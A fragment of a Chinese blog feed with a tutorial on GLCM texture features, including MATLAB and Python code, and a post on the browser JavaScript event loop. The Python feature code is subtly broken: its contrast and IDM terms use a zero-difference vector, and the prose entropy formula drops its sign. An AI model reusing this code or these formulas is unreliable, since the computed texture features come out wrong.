title="纹理特征"></a>纹理特征</h3><p>纹理特征是一种不依赖于颜色或亮度的反映图像中同质现象的视觉特征。它是所有物体表面共有的内在特性，例如云彩、树木、砖、织物等都有各自的纹理特征。纹理特征包含了物体表面结构组织排列的重要信息以及它们与周围环境的联系。正因为如此，纹理特征在 CBIR 中得到了广泛的应用。纹理特征具有四大特点：</p><ul><li>局部序列性重复</li><li>非随机排列</li><li>区域内均匀统一</li><li>旋转不变性</li></ul><p>它通过像素及其周围空间邻域的灰度分布来表现局部纹理信息，并通过不同程度上的重复性展现全局纹理信息。纹理特征在模式匹配中具有优势，因为它是基于区域的统计计算，不容易受局部偏差影响。在检索纹理图像时，纹理特征可以有效区分粗细、疏密等差异较大的纹理，但在纹理之间差异不明显时，可能无法准确反映人眼的视觉感知。一些虚假纹理，如水中倒影或金属面反射造成的影响，可能会误导检索结果。</p><h3 id="形状特征"><a href="#形状特征" class="headerlink" title="形状特征"></a>形状特征</h3><p>物体和区域的形状是图像表达和图像检索中的另一重要的特征。但不同于颜色或纹理等底层特 征，形状特征的表达必须以对图像中物体或区域的划分为基础。由于当前的技术无法做到准确而鲁棒的自动图像分割，图像检索中的形状特征只能用于某些特殊应用，在这些应用中图像包含的物体 或区域可以直接获得。另一方面，由于人们对物体形状的变换、旋转和缩放主观上不太敏感，合适的形状特征必须满足对变换、旋转和缩放无关，这对形状相似度的计算也带来了难度。</p><h2 id="纹理特征提取：灰度共生矩阵"><a href="#纹理特征提取：灰度共生矩阵" class="headerlink" title="纹理特征提取：灰度共生矩阵"></a>纹理特征提取：灰度共生矩阵</h2><p>灰度共生矩阵（Gray-level Co-occurrence Matrix, GLCM）是计算机视觉领域常用的分析图像纹理特征的一种统计方法。</p><blockquote><p>GLCM 本质上是一种矩阵，但我们通常会使用 GLCM 指代基于这种矩阵的分析方法。</p></blockquote><p>GLCM 的概念在 1973 年由 Haralick 等人首次提出，目的是描述图像的纹理特征。因为纹理是由灰度分布在空间位置上反复出现而形成的，所以在图像空间中相隔某距离的两像素之间会存在一定的灰度关系，即图像中灰度的空间相关特性。GLCM 就是用来描述这种空间相关性的，这也是“共生”这个词的意义。所以说 GLCM 描述的从来不是单个像素，而是成对的像素之间的关系。与之相对的，灰度直方图（Grayscale Image Histogram，GIH）则可以看做是对单个像素的统计与描述，并不涉及灰度间的关联关系。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">img = imread(<span class="string">&#x27;test.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">grayImg = rgb2gray(img);</span><br><span class="line"></span><br><span class="line">glcm = graycomatrix(grayImg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">figure</span>;</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>), imshow(img), title(<span class="string">&#x27;Original Image&#x27;</span>);</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>), imshow(glcm,[]), title(<span class="string">&#x27;GLCM&#x27;</span>);</span><br></pre></td></tr></table></figure><p>可以使用以上 MATLAB 代码，获取一张普通的 jpg 图片的 GLCM 并进行对比：</p><p><img src="https://img.ma5hr00m.top/blog/image-20240616231003383.png" alt="image-20240616231003383"></p><h3 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h3><ol><li>确定量化级数：根据图像的灰度级别，创建一个方阵，通常是 256x256；</li><li>定义邻域关系：选择像素对的方向（水平、垂直、对角等）和距离（步长）；</li><li>统计频次：遍历图像，对于每个像素对<code>(i,j)</code>，如果它们的灰度级满足所定义的邻域关系，则在 GLCM 矩阵中相应位置<code>(i,j)</code>的值加一；</li><li>计算概率：将GLCM矩阵中的每个元素除以总次数，得到每种关联模式出现的概率。</li></ol><p>Ok，明白了计算方法，我们就可以尝试自己写个 demo 出来试试成果哩。MatLab 我用得实在是不熟（平成确实没有使用场景），所以接下来的代码是使用 python 完成的。思路也很清晰，使用 <code>PIL</code> 读取图像并转化为灰度图像，然后使用 <code>numpy</code> 计算并创建对应的灰度共生矩阵图像，最后使用 <code>matplotlib</code> 库对原图以及灰度共生矩阵图像进行一个展示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图片并转换为灰度图像</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_image</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">return</span> np.array(Image.<span class="built_in">open</span>(file_name).convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建灰度共生矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_glcm</span>(<span class="params">image, d=<span class="number">1</span>, theta=<span class="number">0</span></span>):</span><br><span class="line">    max_gray_level = <span class="number">256</span></span><br><span class="line">    glcm = np.zeros((max_gray_level, max_gray_level))</span><br><span class="line">    rows, cols = image.shape</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols - d):</span><br><span class="line">            rows_value = image[i][j]</span><br><span class="line">            cols_value = image[i][j + d] <span class="keyword">if</span> theta == <span class="number">0</span> <span class="keyword">else</span> image[i + d][j]</span><br><span class="line">            glcm[rows_value][cols_value] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> glcm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    image_a = read_image(<span class="string">&#x27;a.jpg&#x27;</span>)</span><br><span class="line">    glcm_a = create_glcm(image_a)</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">10</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    plt.imshow(image_a, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;Original Image&#x27;</span>)</span><br><span class="line">    plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    plt.imshow(glcm_a, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;GLCM of Image&#x27;</span>)</span><br><span class="line">    plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>前面说了，GLCM 严格说是一种用于描述图像纹理特征的二维矩阵。这个矩阵每行或每列代表不同灰度级别的出现关系，对角线表示相邻像素灰度一致性。对每行进行累加可得到一个 256 维向量，表示原图中每个灰度级别像素的出现次数，类似灰度直方图。全元素求和等于总像素个数减去步长乘以跳跃次数。其不一定对称，因为 <code>(1,3)</code> 和 <code>(3,1)</code> 表示不同灰度关系。这种特殊的矩阵具有四个特性，分别是：</p><ol><li><p>对比度：用于度量矩阵值的分布和局部变化，反应图像的清晰度和纹理的沟纹深浅。对比度越大，影像越清晰。计算公式如下，其中 <code>i</code>、<code>j</code> 为共生矩阵中的坐标索引，<code>P(i,j)</code> 为该位置的灰度值（对于共生矩阵来说就是某种灰度关联关系出现的次数）：</p><p>[Con &#x3D; \sum_{i}^{} \sum_{j}^{} (i-j)^{2}P(i,j)]</p></li><li><p>能量：灰度共生矩阵元素值的平方和，称其为能量，也叫第二角力矩（Angular Second Moment, ASM）。反应了图像灰度分布均匀程度和纹理粗细度。如果其较大，则表明图像中存在一种较为均一和规则变化的纹理模式。计算公式如下：</p><p>[Asm &#x3D; \sum_{i}^{} \sum_{j}^{} P(i,j)^{2}]</p></li><li><p>熵：在灰度共生矩阵中表示图像的信息量。当共生矩阵中元素分布较为分散时，熵较大。它表示了图像中纹理的非均匀程度或者复杂程度。计算公式如下：</p><p>[Ent &#x3D; \sum_{i}^{} \sum_{j}^{} P(i,j)logP(i,j)]</p></li><li><p>相关度：度量灰度共生矩阵元素在行或列方向上的相似程度（Inverse Different Moment）。其值反应了图像中局部灰度相关性。当矩阵元素均匀相等时，相关度较大，反之较小。计算公式如下：</p><p>[IDM &#x3D; \sum_{i}^{} \sum_{j}^{} \frac{P(i,j)}{1+(i-j)^{2}}]</p></li></ol><p>虽然我们掌握了四种特性值的计算方法，可以用文本数值对图像的纹理特征进行表示了，但还是有不方便的地方，将两组图像的纹理特征进行对比时，如果两项特性值高、两项特性值低该怎么办？这就需要归一化处理。对 GLCM 进行归一化处理的主要目的是消除图像大小、对比度等因素对特征计算的影响，从而使得特征更具有普适性和可比性。这样做的好处包括：</p><p>GLCM 的归一化主要包括两种常见的方法：</p><ul><li>将 GLCM 矩阵中的元素值除以 GLCM 矩阵中所有元素值的和，使得归一化后的 GLCM 矩阵中所有元素之和为1</li><li>将 GLCM 矩阵中的元素值除以 GLCM 矩阵中元素值的平方和的平方根，使得归一化后的 GLCM 矩阵中元素值的平方和为1。</li></ul><p>进行归一化处理后得到的数值一般被称为 <strong>规范化纹理特征</strong>，我们可以使用该值对图像之间的纹理特征进行一个就更加具象的对比。</p><h3 id="进一步实践"><a href="#进一步实践" class="headerlink" title="进一步实践"></a>进一步实践</h3><p>掌握了以上内容，现在我们可以做一个更加贴近现实的实践了。我准备了三张图片，有两张是动物的皮毛，还有一张是爬行动物的鳞甲图（下面这张图是实验结果的一部分，三张图片原图是彩图，不过对实验没什么影响）：</p><p><img src="https://img.ma5hr00m.top/blog/image-20240617003235838.png" alt="image-20240617003235838"></p><p>使用 Python 分别计算三张图片的灰度共生矩阵，然后计算四项特征值，再进行归一化处理，最后根据规范化纹理特征判断哪两张图像的纹理特征更接近。因为代码里很多内容是在调用函数、输出结果以及展示图片，所以不全贴出来，只展示部分核心代码，也就是做计算提取图像纹理特征那块，完整代码上传到了我的一个存储学校作业的 GitHub 仓库中，位于“数字图像处理”目录下，也包括了三张示范图片，可以自行前往查看。点击此 <a href="https://github.com/HDU-Course/HDU-shilingu-courses">链接</a> 前往。</p><p>以下为核心函数代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取图片并转换为灰度图像</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_image</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">return</span> np.array(Image.<span class="built_in">open</span>(file_name).convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建灰度共生矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_glcm</span>(<span class="params">image, d=<span class="number">1</span>, theta=<span class="number">0</span></span>):</span><br><span class="line">    max_gray_level = <span class="number">256</span></span><br><span class="line">    glcm = np.zeros((max_gray_level, max_gray_level))</span><br><span class="line">    rows, cols = image.shape</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols - d):</span><br><span class="line">            rows_value = image[i][j]</span><br><span class="line">            cols_value = image[i][j + d] <span class="keyword">if</span> theta == <span class="number">0</span> <span class="keyword">else</span> image[i + d][j]</span><br><span class="line">            glcm[rows_value][cols_value] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> glcm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算特征值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_features</span>(<span class="params">glcm</span>):</span><br><span class="line">    contrast = np.<span class="built_in">sum</span>(np.square(np.arange(glcm.shape[<span class="number">0</span>]) - np.arange(glcm.shape[<span class="number">1</span>])) * glcm)</span><br><span class="line">    energy = np.<span class="built_in">sum</span>(np.square(glcm))</span><br><span class="line">    entropy = -np.<span class="built_in">sum</span>(glcm * np.ma.log(glcm).filled(<span class="number">0</span>))</span><br><span class="line">    inverse_diff_moment = np.<span class="built_in">sum</span>(glcm / (<span class="number">1</span> + np.square(np.arange(glcm.shape[<span class="number">0</span>]) - np.arange(glcm.shape[<span class="number">1</span>]))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> contrast, energy, entropy, inverse_diff_moment</span><br><span class="line"></span><br><span class="line"><span class="comment"># 归一化处理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_features</span>(<span class="params">features</span>):</span><br><span class="line">    normalized_features = (features - np.mean(features)) / np.std(features)</span><br><span class="line">    <span class="keyword">return</span> normalized_features</span><br></pre></td></tr></table></figure><p>运行结果，轻松得出 a 与 b 更加相似的结论：</p><p><img src="https://img.ma5hr00m.top/blog/image-20240617003516465.png" alt="image-20240617003516465"></p><h2 id="阅读文档"><a href="#阅读文档" class="headerlink" title="阅读文档"></a>阅读文档</h2><ul><li><p><a href="https://github.com/scikit-image/skimage-tutorials">https://github.com/scikit-image/skimage-tutorials</a></p></li><li><p><a href="https://leovan.me/cn/2022/01/content-based-image-retrieval/">https://leovan.me/cn/2022/01/content-based-image-retrieval/</a></p></li><li><p><a href="https://www.cs.cmu.edu/~juny/Prof/papers/Part2-CBIR.pdf">https://www.cs.cmu.edu/~juny/Prof/papers/Part2-CBIR.pdf</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1934204">特征提取——纹理特征-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/2219407">GLCM 灰度共生矩阵与 Haralick 特征-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1010272">纹理特征提取方法：LBP, 灰度共生矩阵-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li><li><p><a href="http://zhaoxuhui.top/blog/2022/03/15/gray-level-co-occurence-matrix.html">http://zhaoxuhui.top/blog/2022/03/15/gray-level-co-occurence-matrix.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Computer Graphics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Graphics </tag>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器中的 Event Loop</title>
      <link href="/2024/06/05/2024/browser-eventloop/"/>
      <url>/2024/06/05/2024/browser-eventloop/</url>
      
        <content type="html"><![CDATA[<p>事件循环是 JavaScript 管理事件执行顺序的流程，具体实现与运行环境有关。本篇文章主要讲述浏览器环境中的事件循环，Node.js 中的事件循环就简单说说分哪几个阶段。</p><h2 id="同步异步"><a href="#同步异步" class="headerlink" title="同步异步"></a>同步异步</h2><p>同步（Synchronous）执行指的是代码按顺序一行接一行地执行。每个操作必须等待前一个操作完成后才能开始。这种模式简单易懂，但它有一个缺点：如果一个操作需要很长时间来完成（例如，从服务器获取数据），它会阻塞后续代码的执行，导致整个程序暂停，直到该操作完成。这对于 Web 应用来说是无法忍受的，总不发出请求后一直等待所有数据全到手之后再渲染页面，这样搞用户的心情想必不会很美丽。</p><p>异步（Asynchronous）执行允许代码在等待一个耗时任务（如数据请求）完成时继续执行其他任务。这是通过回调函数、Promises 或 async&#x2F;await 等机制实现的。异步编程使得 JavaScript 可以同时处理多个操作，提高了程序的效率和用户体验。</p><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p><img src="https://img.ma5hr00m.top/blog/20240610160305.png" alt="20240610160305"></p><p>事件循环（Event Loop）是 JavaScript 中处理异步操作的核心机制。它确保即使在单线程环境中，JavaScript 也能够执行非阻塞操作。以下是事件循环的详细流程说明，看完这个就基本清晰异步操作的实现过程了：</p><ol><li>**执行栈（Execution Stack）：**所有同步任务都在主线程上的执行栈中运行。执行栈是一个按顺序存储函数调用的结构。当一个函数执行完毕，它就会从栈中弹出。</li><li>**Web API：**当遇到异步任务（如 <code>setTimeout</code> 或网络请求）时，浏览器提供的 Web API 会接管这些任务，并在后台运行。</li><li>**任务队列（Task Queue）：**异步任务完成后，回调函数会被放入任务队列。如果有多个回调，它们会按照它们被添加到队列的顺序排队。</li><li>**事件循环（Event Loop—）：**事件循环持续检查执行栈是否为空。如果执行栈为空，事件循环会从任务队列中取出第一个回调函数，并将其推入执行栈中执行。</li><li>**微任务队列（Microtask Queue）：**微任务（如 <code>Promise</code> 的回调）会被添加到微任务队列。微任务队列的特点是在当前执行栈清空后，事件循环会在执行下一个宏任务（如 <code>setTimeout</code> 的回调）之前，先执行所有微任务。</li><li><strong>渲染 (Rendering)</strong>: 在某些情况下，如页面渲染或用户交互，浏览器会在适当的时候执行渲染任务。</li></ol><p>这个过程不断重复，形成了一个循环，确保 JavaScript 可以连续处理任务，而不会阻塞主线程。这就是事件循环的工作原理，它使得即使是单线程的 JavaScript 也能够支持复杂的异步操作和高效的用户交互。</p><h2 id="宏任务微任务"><a href="#宏任务微任务" class="headerlink" title="宏任务微任务"></a>宏任务微任务</h2><p>介绍事件循环时有提到宏任务和微任务，解宏任务（Macro Task）和微任务（Micro Task）对于掌握事件循环至关重要。这两种任务决定了代码的执行顺序和时机。</p><h3 id="本质区别"><a href="#本质区别" class="headerlink" title="本质区别"></a>本质区别</h3><p><strong>宏任务</strong>是由宿主环境（如浏览器或 Node.js）发起的任务。它们通常包括：</p><ul><li><strong><code>setTimeout</code></strong></li><li><strong><code>setInterval</code></strong></li><li><strong><code>I/O</code></strong></li><li>UI渲染</li><li><strong><code>postMessage</code></strong></li><li><strong><code>MessageChannel</code></strong></li></ul><p><strong>而微任务</strong>则是由 JavaScript 引擎发起的任务，它们通常用于处理一些不需要长时间运行或等待的操作，如：</p><ul><li><strong><code>Promise.then</code></strong></li><li><strong><code>MutationObserver</code></strong></li><li><strong><code>process.nextTick</code></strong> （Node.js）</li></ul><p>宏任务和微任务的执行时机不同。在每次事件循环中，一个宏任务会被执行，然后所有的微任务会被执行。这意味着微任务总是在当前宏任务结束后立即执行，而不是等待下一个宏任务。</p><p>这种区分允许 JavaScript 引擎优化异步操作的处理。通过微任务，JavaScript 可以快速响应并处理短暂的异步操作，而宏任务则用于可能需要更多时间来完成的操作。这种机制确保了即使在单线程环境中，JavaScript 也能够有效地处理复杂的异步场景。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>从前文事件循环的实现流程可以看出，宏任务和微任务的概念与其密切相关。事件循环是 JavaScript 早期就存在的机制，但微任务的概念是随着 ES6 规范的引入才明确的，特别是在引入<code>Promise</code>之后。<code>Promise</code>是在 ES6 中正式成为标准的，它允许 JavaScrip t引擎自身发起异步任务，而不仅仅依赖于宿主环境。</p><p>这俩概念的提出是为了解决 JavaScript 在处理异步操作时的效率问题。在早期的 JavaScript 中，所有的异步操作都被视为宏任务，这导致了效率低下和响应性差的问题。通过引入微任务，JavaScript 能够更快地处理那些不需要等待的异步操作，从而提高了程序的整体性能。</p><h3 id="示范代码"><a href="#示范代码" class="headerlink" title="示范代码"></a>示范代码</h3><p>前文说得已经比较清楚了，这里再给个代码示范：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;宏任务开始&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;宏任务&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;微任务 1&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;微任务 2&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;宏任务结束&#x27;</span>);</span><br></pre></td></tr></table></figure><p>以上代码的输出如下，初学者可以思考下输出为什么是这个顺序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">宏任务开始</span><br><span class="line">宏任务结束</span><br><span class="line">微任务 1</span><br><span class="line">微任务 2</span><br><span class="line">宏任务</span><br></pre></td></tr></table></figure><p>以下是这段代码运行时发生的事件顺序：</p><ol><li>因为<code>console.log</code>是同步操作，所以首先会在控制台打印出<code>&#39;宏任务开始&#39;</code>；</li><li><code>setTimeout</code>是一个宏任务。尽管它设置了<code>0</code>毫秒的延迟，但它不会立即执行。它会被添加到宏任务队列中，在当前执行上下文清空并且所有微任务都被处理后执行；</li><li><code>Promise.resolve()</code>创建了一个已解决的promise，这是一个微任务。<code>.then</code>方法被链式调用来处理微任务。这些将被添加到微任务队列中，并且会在当前调用栈为空时立即执行，但在下一个宏任务之前；</li><li>接下来，因为是下一行同步代码，所以会在控制台打印出<code>&#39;宏任务结束&#39;</code>；</li><li>在当前宏任务（即整个脚本）执行完毕后，JavaScript引擎会检查是否有微任务在队列中。它找到了promise的<code>.then</code>方法中的回调，并按顺序执行它们。这导致控制台依次打印出<code>&#39;微任务 1&#39;</code>和<code>&#39;微任务 2&#39;</code>；</li><li>所有微任务完成后，引擎会检查宏任务队列。现在执行<code>setTimeout</code>的回调，控制台打印出<code>&#39;宏任务&#39;</code>。</li></ol><h2 id="定时器不准确"><a href="#定时器不准确" class="headerlink" title="定时器不准确"></a>定时器不准确</h2><p>学到东西就要拿来解决问题，定时器不准确就算是一个经典问题。在 JavaScript 中，定时器的不准确性主要是由于事件循环的工作方式造成的。<code>setTimeout</code> 和 <code>setInterval</code> 这样的定时器函数并不保证回调函数会在指定的时间精确执行。<strong>定时器只是在指定的延迟后将回调函数放入事件队列</strong>，但实际上它何时被执行取决于主线程上当前正在执行的任务。</p><p>当你设置一个定时器时，例如 <code>setTimeout(callback, 2000)</code>，你告诉 JavaScript 引擎在大约 2 秒后将 <code>callback</code> 放入事件队列。但是，如果主线程在执行长时间运行的同步任务，如你的 <code>syncFunc</code> 函数，它会阻塞线程，直到该任务完成。在这段时间内，即使定时器的时间已经过去，回调函数也不会执行，因为事件循环必须等待主线程变为空闲才能从事件队列中取出回调函数并执行它。</p><p>下面是一个简化的事件循环流程，以帮助理解：</p><ol><li><strong>执行同步代码</strong>：主线程首先执行所有同步代码。</li><li><strong>设置定时器</strong>：遇到 <code>setTimeout</code>，将其回调函数和计时请求交给定时器线程。</li><li><strong>计时结束</strong>：定时器线程计时结束后，通知事件触发线程。</li><li><strong>排队等待</strong>：事件触发线程将定时器回调放入事件队列。</li><li><strong>检查主线程</strong>：如果主线程空闲，事件循环将从事件队列中取出回调函数执行；如果主线程忙，回调函数必须等待。</li></ol><p>为了避免定时器不准确，开发者应该尽量避免在主线程上执行长时间的同步任务。如果必须执行这样的任务，可以考虑使用 Web Workers 或者将任务分解为更小的部分，使用 <code>requestAnimationFrame</code> 或 <code>requestIdleCallback</code> 来安排非紧急任务的执行。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">syncFunc</span> = (<span class="params">startTime</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() - time &lt; <span class="number">5000</span>) &#123; <span class="comment">/* 长时间同步阻塞 */</span> &#125;</span><br><span class="line">  <span class="keyword">const</span> offset = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() - startTime;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`同步函数执行完毕，时间偏差：<span class="subst">$&#123;offset&#125;</span>毫秒`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">asyncFunc</span> = (<span class="params">startTime</span>) =&gt; &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> offset = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() - startTime;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`异步函数执行完毕，时间偏差：<span class="subst">$&#123;offset&#125;</span>毫秒`</span>);</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> startTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line"><span class="title function_">asyncFunc</span>(startTime);</span><br><span class="line"><span class="title function_">syncFunc</span>(startTime);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>syncFunc</code> 会阻塞主线程5秒钟，即使 <code>asyncFunc</code> 的定时器在2秒后到期，它的回调也必须等待 <code>syncFunc</code> 完成。这就是为什么定时器的执行时间可能不准确。为了提高定时器的准确性，应当尽量减少同步代码的执行时间，或者使用其他机制来处理长时间运行的任务。</p><h2 id="requestAnimationFrame-requestIdleCallback"><a href="#requestAnimationFrame-requestIdleCallback" class="headerlink" title="requestAnimationFrame &amp; requestIdleCallback"></a>requestAnimationFrame &amp; requestIdleCallback</h2><p><code>requestAnimationFrame()</code> 和 <code>requestIdleCallback()</code> 是两个与浏览器事件循环和渲染过程紧密相关的 Web API。它们在不同的时间点被调用，以优化性能和响应性。<code>requestAnimationFrame()</code> 适合需要与屏幕刷新率同步的任务，如动画，而 <code>requestIdleCallback()</code> 适合可以推迟执行的任务，如统计和数据处理。</p><h3 id="requestAnimationFrame"><a href="#requestAnimationFrame" class="headerlink" title="requestAnimationFrame()"></a><strong>requestAnimationFrame()</strong></h3><p><code>requestAnimationFrame()</code> 主要用于动画和页面重绘之前的更新操作，它告诉浏览器你希望执行动画，并请求浏览器在下次重绘之前调用指定的函数来更新动画。函数通常在每次屏幕刷新之前执行，大约是每秒 60 